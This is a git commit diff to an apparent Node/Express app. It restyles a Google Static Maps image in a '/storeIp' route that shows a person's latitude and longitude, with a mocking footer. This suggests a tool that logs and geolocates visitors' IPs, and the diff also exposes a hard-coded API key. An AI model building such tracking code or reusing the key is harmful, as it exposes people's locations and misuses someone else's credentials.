77e19be25bb3cf13599027508efeb138056ed6dc
Ritesh Ahlawat <riteshahlawat1@gmail.com>
2020-04-05 02:40:55 -0400

    Update

--- index.js
+++ index.js
@@ -68,7 +68,7 @@ app.get("/storeIp", (req, res) => {
         { name: "Longitude", value: `${long}`, inline: true },
         { name: "\u200B", value: "\u200B" }
       )
-      .setImage(`https://maps.googleapis.com/maps/api/staticmap?&zoom=11&size=500x400&maptype=roadmap&markers=color:red%7C${lat},${long}&key=AIzaSyCxVxnNUAEL2BFgScCl5CwPD1yDulNe5Hg`)
+      .setImage(`https://maps.googleapis.com/maps/api/staticmap?key=AIzaSyCxVxnNUAEL2BFgScCl5CwPD1yDulNe5Hg&center=${lat},${long}&zoom=11&format=png&maptype=roadmap&style=element:geometry%7Ccolor:0x242f3e&style=element:labels.text.fill%7Ccolor:0x746855&style=element:labels.text.stroke%7Ccolor:0x242f3e&style=feature:administrative.locality%7Celement:labels.text.fill%7Ccolor:0xd59563&style=feature:poi%7Celement:labels.text.fill%7Ccolor:0xd59563&style=feature:poi.park%7Celement:geometry%7Ccolor:0x263c3f&style=feature:poi.park%7Celement:labels.text.fill%7Ccolor:0x6b9a76&style=feature:road%7Celement:geometry%7Ccolor:0x38414e&style=feature:road%7Celement:geometry.stroke%7Ccolor:0x212a37&style=feature:road%7Celement:labels.text.fill%7Ccolor:0x9ca5b3&style=feature:road.highway%7Celement:geometry%7Ccolor:0x746855&style=feature:road.highway%7Celement:geometry.stroke%7Ccolor:0x1f2835&style=feature:road.highway%7Celement:labels.text.fill%7Ccolor:0xf3d19c&style=feature:transit%7Celement:geometry%7Ccolor:0x2f3948&style=feature:transit.station%7Celement:labels.text.fill%7Ccolor:0xd59563&style=feature:water%7Celement:geometry%7Ccolor:0x17263c&style=feature:water%7Celement:labels.text.fill%7Ccolor:0x515c6d&style=feature:water%7Celement:labels.text.stroke%7Ccolor:0x17263c&size=500x400`)
       .setTimestamp()
       .setFooter("He do be getting yeeted doe");
 
